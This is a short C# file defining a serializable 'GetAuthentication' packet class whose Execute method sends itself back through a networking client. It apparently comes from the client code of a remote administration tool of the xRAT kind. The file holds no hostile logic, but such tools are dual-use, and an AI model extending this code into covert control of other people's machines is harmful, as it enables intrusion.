using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class GetAuthentication : IPacket
{
	public void Execute(Client client)
	{
		client.Send(this);
	}
}
